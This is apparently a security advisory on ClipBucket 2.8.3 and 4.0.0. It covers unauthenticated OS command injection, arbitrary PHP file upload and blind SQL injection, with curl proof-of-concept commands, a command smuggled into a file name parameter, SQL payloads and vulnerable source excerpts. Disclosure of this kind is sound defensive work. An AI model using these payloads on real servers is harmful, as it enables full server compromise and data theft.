Vendor description:
-------------------
"ClipBucket is a free and open source software which helps us to create a
complete video sharing website like YouTube, Dailymotion, Metacafe, Veoh, Hulu
in few minutes of setup. It was first created in 2007 by Arslan Hassan and his
team of developers. ClipBucket was developed as a YouTube clone but has been
upgraded with advanced features and enhancements. It uses FFMPEG for video
conversion and thumbs generation which is the most widely used application so,
users can stream it straight away using the Video JS and HTML 5 Players."

Business recommendation:
------------------------
By exploiting the vulnerabilities documented in this advisory, an attacker can
fully compromise the web server which has ClipBucket installed. Potentially
sensitive data might get exposed through this attack.

Users are advised to immediately install the patched version provided by the
vendor.


Vulnerability overview/description:
-----------------------------------
1. Unauthenticated OS Command Injection
Any OS commands can be injected by an unauthenticated attacker. This is a serious
vulnerability as the chances for the system to be fully compromised is very
high. This same vulnerability can also be exploited by authenticated attackers
with normal user privileges.

2. Unauthenticated Arbitrary File Upload
A malicious file can be uploaded into the webserver by an unauthenticated
attacker. It is possible for an attacker to upload a script to issue operating
system commands. This same vulnerability can also be exploited by an
authenticated attacker with normal user privileges.

3. Unauthenticated Blind SQL Injection
The identified SQL injection vulnerabilities enable an attacker to execute
arbitrary SQL commands on the underlying MySQL server.


Proof of concept:
-----------------
1. Unauthenticated OS Command Injection
Without having to authenticate, an attacker can exploit this vulnerability
by manipulating the "file_name" parameter during the file upload in the script
/api/file_uploader.php:

 $ curl -F "Filedata=@pfile.jpg" -F "file_name=aa.php ||<<COMMAND HERE>>"
http://$HOST/api/file_uploader.php


Alternatively, this vulnerability can also be exploited by authenticated basic
privileged users with the following payload by exploiting the same issue in
/actions/file_downloader.php:

$ curl --cookie "[--SNIP--]" --data "file=http://localhost/vid.mp4&file_name=abc
|| <<COMMAND HERE>>" "http://$HOST/actions/file_downloader.php"


2. Unauthenticated Arbitrary File Upload
Below is the cURL request to upload arbitrary files to the webserver with no
authentication required.

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/beats_uploader.php"

$ curl -F "file=@pfile.php" -F "plupload=1" -F "name=anyname.php"
"http://$HOST/actions/photo_uploader.php"

Furthermore, this vulnerability is also available to authenticated users with
basic privileges:

$ curl --cookie "[--SNIP--]" -F
"coverPhoto=@valid-image-with-appended-phpcode.php"
"http://$HOST/edit_account.php?mode=avatar_bg"


3. Unauthenticated Blind SQL Injection
The following parameters have been identified to be vulnerable against
unauthenticated blind SQL injection.

URL     : http://$HOST/actions/vote_channel.php
METHOD  : POST
PAYLOAD : channelId=channelId=1-BENCHMARK(100000000, rand())

The source code excerpt below shows the vulnerable code
VULN. FILE : /actions/vote_channel.php
VULN. CODE :
[...]
$vote = $_POST["vote"];
$userid = $_POST["channelId"];
//if($userquery->login_check('',true)){
if($vote == "yes"){
    $query = "UPDATE " . tbl("users") . " SET voted = voted + 1, likes = likes + 1
WHERE userid = {$userid}";
}else{
    //$query = "UPDATE " . tbl("users") . " SET likes = likes (- 1) WHERE userid =
{$userid}";
    $sel = "Select userid,username,likes From ".tbl("users")." WHERE userid =
{$userid}";
    $result = $db->Execute($sel);
     foreach ($result as $row )
        $current_likes = $row['likes'];
        $decremented_like = $current_likes-1;
     $query = "Update ".tbl("users")." Set likes = $decremented_like Where userid
= $userid";
}
[...]

URL     : http://$HOST/ajax/commonAjax.php
METHOD  : POST
PAYLOAD : mode=emailExists&email=1' or '1'='1

The source code excerpt below shows the vulnerable code
VULN. FILE : /ajax/commonAjax.php
VULN. CODE :
[...]
$email = $_POST['email'];
$check = $db->select(tbl('users'),"email"," email='$email'");
if (!$check) {
    echo "NO";
}
[...]

URL     : http://$HOST/ajax/commonAjax.php
METHOD  : POST
PAYLOAD : mode=userExists&username=1' or '1'='1

The source code excerpt below shows the vulnerable code
VULN. FILE : /ajax/commonAjax.php
VULN. CODE :
[...]
$username = $_POST['username'];
$check = $db->select(tbl('users'),"username"," username='$username'");
if (!$check) {
    echo "NO";
}
[...]


Vulnerable / tested versions:
-----------------------------
Clipbucket version 2.8.3 and version 4.0.0 have been tested. These versions were
the latest at the time the security vulnerabilities were discovered.
